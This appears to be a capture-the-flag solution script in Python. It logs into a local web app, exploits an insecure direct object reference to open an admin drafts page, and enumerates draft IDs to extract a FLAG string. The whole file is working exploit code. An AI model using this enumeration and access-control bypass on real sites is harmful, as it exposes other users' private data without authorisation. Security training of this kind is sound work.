import requests
from bs4 import BeautifulSoup
import re

# Base URL
BASE_URL = "http://127.0.0.1:5003"

# Create session to maintain cookies
session = requests.Session()

print("[*] Step 1: Attempting to login with testuser:test123")

# Try to login first
login_data = {
    "username": "testuser",
    "password": "test123"
}

login_response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
print(f"[+] Login attempt - Status: {login_response.status_code}")
print(f"[+] Login response headers: {dict(login_response.headers)}")

# Check if login was successful (redirect indicates success)
if login_response.status_code == 302 or login_response.status_code == 200:
    if login_response.status_code == 302:
        print("[+] Login successful (redirected)")
    else:
        # Check if we need to register first
        if "does not exist" in login_response.text or "Invalid" in login_response.text:
            print("[*] Step 2: User doesn't exist, registering account")
            register_data = {
                "username": "testuser",
                "password": "test123"
            }
            register_response = session.post(f"{BASE_URL}/register", data=register_data, allow_redirects=False)
            print(f"[+] Registration - Status: {register_response.status_code}")
            
            # Try login again after registration
            print("[*] Step 3: Logging in after registration")
            login_response = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
            print(f"[+] Second login attempt - Status: {login_response.status_code}")
        else:
            print("[+] Login successful (200 OK)")

# Print current cookies
print(f"[+] Session cookies: {dict(session.cookies)}")

print("\n[*] Step 4: Exploiting IDOR - Accessing /admin/drafts")

# Access admin drafts endpoint (IDOR vulnerability)
admin_drafts_response = session.get(f"{BASE_URL}/admin/drafts")
print(f"[+] Admin drafts access - Status: {admin_drafts_response.status_code}")
print(f"[+] Response length: {len(admin_drafts_response.content)}B")

if admin_drafts_response.status_code == 200:
    print("[+] Successfully accessed admin drafts!")
    print(f"\n[+] Admin drafts page content:\n{admin_drafts_response.text}\n")
    
    # Parse HTML to find draft IDs
    soup = BeautifulSoup(admin_drafts_response.text, 'html.parser')
    
    # Look for draft links or IDs in the HTML
    draft_ids = []
    
    # Method 1: Find links to edit_draft
    edit_links = soup.find_all('a', href=re.compile(r'/edit_draft/\d+'))
    for link in edit_links:
        draft_id = re.search(r'/edit_draft/(\d+)', link['href'])
        if draft_id:
            draft_ids.append(draft_id.group(1))
    
    # Method 2: Search for draft IDs in text
    draft_id_matches = re.findall(r'draft[_\s]*id[:\s]*(\d+)', admin_drafts_response.text, re.IGNORECASE)
    draft_ids.extend(draft_id_matches)
    
    # Method 3: Find any numeric patterns that might be IDs
    if not draft_ids:
        # Look for list items or table rows with numbers
        all_links = soup.find_all('a')
        for link in all_links:
            href = link.get('href', '')
            id_match = re.search(r'/(\d+)', href)
            if id_match:
                draft_ids.append(id_match.group(1))
    
    # Remove duplicates
    draft_ids = list(set(draft_ids))
    
    print(f"[*] Step 5: Found {len(draft_ids)} potential draft IDs: {draft_ids}")
    
    # If no IDs found in links, try common ID ranges
    if not draft_ids:
        print("[*] No draft IDs found in HTML, trying common ID range (1-10)")
        draft_ids = [str(i) for i in range(1, 11)]
    
    # Access each draft to find the FLAG
    print("\n[*] Step 6: Accessing each draft to find FLAG")
    flag_found = False
    
    for draft_id in draft_ids:
        print(f"\n[*] Accessing draft ID: {draft_id}")
        draft_response = session.get(f"{BASE_URL}/edit_draft/{draft_id}")
        print(f"[+] Draft {draft_id} - Status: {draft_response.status_code} | Length: {len(draft_response.content)}B")
        
        if draft_response.status_code == 200:
            # Search for FLAG in response
            flag_match = re.search(r'FLAG\{[^}]+\}', draft_response.text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n{'='*60}")
                print(f"[!] FLAG FOUND in draft {draft_id}!")
                print(f"[!] FLAG: {flag}")
                print(f"{'='*60}")
                flag_found = True
                
                # Print the full response for context
                print(f"\n[+] Full draft {draft_id} content:\n{draft_response.text}")
                break
            else:
                print(f"[+] Draft {draft_id} content (no FLAG found):\n{draft_response.text[:500]}")
        else:
            print(f"[-] Failed to access draft {draft_id}")
    
    if not flag_found:
        print("\n[-] No FLAG found in any drafts")
        print("[*] Trying extended ID range (1-50)")
        
        for draft_id in range(1, 51):
            draft_response = session.get(f"{BASE_URL}/edit_draft/{draft_id}")
            
            if draft_response.status_code == 200:
                flag_match = re.search(r'FLAG\{[^}]+\}', draft_response.text)
                if flag_match:
                    flag = flag_match.group(0)
                    print(f"\n{'='*60}")
                    print(f"[!] FLAG FOUND in draft {draft_id}!")
                    print(f"[!] FLAG: {flag}")
                    print(f"{'='*60}")
                    print(f"\n[+] Full draft {draft_id} content:\n{draft_response.text}")
                    flag_found = True
                    break
                elif draft_id % 10 == 0:
                    print(f"[*] Checked up to draft {draft_id}, no FLAG yet...")
        
        if not flag_found:
            print("\n[-] FLAG not found in extended range either")

else:
    print(f"[-] Failed to access admin drafts")
    print(f"[+] Response: {admin_drafts_response.text}")

